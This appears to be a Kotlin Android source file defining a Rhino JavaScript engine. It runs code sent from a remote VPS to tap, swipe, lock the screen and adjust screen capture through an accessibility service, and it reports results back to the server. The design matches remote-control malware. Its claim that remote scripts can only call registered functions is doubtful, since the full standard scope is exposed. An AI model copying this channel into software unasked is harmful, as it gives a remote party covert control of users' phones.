package com.sanpidor.protect

import android.util.Log
import org.mozilla.javascript.Context
import org.mozilla.javascript.Function
import org.mozilla.javascript.Scriptable
import org.mozilla.javascript.ScriptableObject

/**
 * JS-движок на базе Rhino.
 * VPS отправляет JS-код → Rhino выполняет внутри APK →
 * JS вызывает только заранее зарегистрированные функции:
 *   tap(x, y), swipe(x1,y1,x2,y2,ms), back(), home(), recents(),
 *   captureScreen(), lock(), setFps(n), log(msg)
 */
class JsEngine(
    private val onResult: (String) -> Unit   // отправить результат обратно на VPS
) {

    private val scope: Scriptable

    init {
        val cx = Context.enter()
        cx.optimizationLevel = -1   // обязательно для Android (нет JIT)
        scope = cx.initStandardObjects()

        // Регистрируем нативные функции доступные из JS
        registerNatives(cx, scope)
        Context.exit()
    }

    /**
     * Выполнить JS-код пришедший с VPS.
     * Код может только вызывать зарегистрированные функции.
     */
    fun eval(jsCode: String) {
        try {
            val cx = Context.enter()
            cx.optimizationLevel = -1
            cx.evaluateString(scope, jsCode, "remote", 1, null)
            Context.exit()
        } catch (e: Exception) {
            Log.e(TAG, "JS eval error: ${e.message}")
            onResult("""{"type":"error","message":"${e.message}"}""")
        }
    }

    private fun registerNatives(cx: Context, scope: Scriptable) {

        // tap(x, y)  — координаты 0..1 относительные
        scope.put("tap", scope, jsFunc { args ->
            val x = toFloat(args, 0)
            val y = toFloat(args, 1)
            ProtectAccessibilityService.performTap(x, y)
            onResult("""{"type":"ok","cmd":"tap","x":$x,"y":$y}""")
            null
        })

        // swipe(x1, y1, x2, y2, durationMs)
        scope.put("swipe", scope, jsFunc { args ->
            val x1  = toFloat(args, 0)
            val y1  = toFloat(args, 1)
            val x2  = toFloat(args, 2)
            val y2  = toFloat(args, 3)
            val dur = toLong(args,  4, 300L)
            ProtectAccessibilityService.performSwipe(x1, y1, x2, y2, dur)
            onResult("""{"type":"ok","cmd":"swipe"}""")
            null
        })

        // back() / home() / recents()
        scope.put("back",    scope, jsFunc { ProtectAccessibilityService.performBack();    onResult(ok("back"));    null })
        scope.put("home",    scope, jsFunc { ProtectAccessibilityService.performHome();    onResult(ok("home"));    null })
        scope.put("recents", scope, jsFunc { ProtectAccessibilityService.performRecents(); onResult(ok("recents")); null })

        // lock() — выключить экран
        scope.put("lock", scope, jsFunc {
            ScreenCaptureService.requestLock()
            onResult(ok("lock"))
            null
        })

        // setFps(n) — изменить частоту кадров
        scope.put("setFps", scope, jsFunc { args ->
            val fps = toInt(args, 0, 5).coerceIn(1, 15)
            ScreenCaptureService.setFrameInterval(1000L / fps)
            onResult("""{"type":"ok","cmd":"setFps","fps":$fps}""")
            null
        })

        // log(msg) — отправить произвольный текст обратно на VPS
        scope.put("log", scope, jsFunc { args ->
            val msg = args.getOrNull(0)?.toString() ?: ""
            onResult("""{"type":"log","message":"$msg"}""")
            null
        })
    }

    // Хелпер — создать JS-функцию из лямбды
    private fun jsFunc(block: (Array<Any?>) -> Any?): Function {
        return object : org.mozilla.javascript.BaseFunction() {
            override fun call(
                cx: Context, scope: Scriptable,
                thisObj: Scriptable?, args: Array<Any?>
            ): Any? = block(args)
        }
    }

    private fun ok(cmd: String) = """{"type":"ok","cmd":"$cmd"}"""

    private fun toFloat(args: Array<Any?>, idx: Int, default: Float = 0f): Float =
        args.getOrNull(idx)?.toString()?.toFloatOrNull() ?: default

    private fun toInt(args: Array<Any?>, idx: Int, default: Int = 0): Int =
        args.getOrNull(idx)?.toString()?.toIntOrNull() ?: default

    private fun toLong(args: Array<Any?>, idx: Int, default: Long = 0L): Long =
        args.getOrNull(idx)?.toString()?.toLongOrNull() ?: default

    companion object {
        private const val TAG = "JsEngine"
    }
}
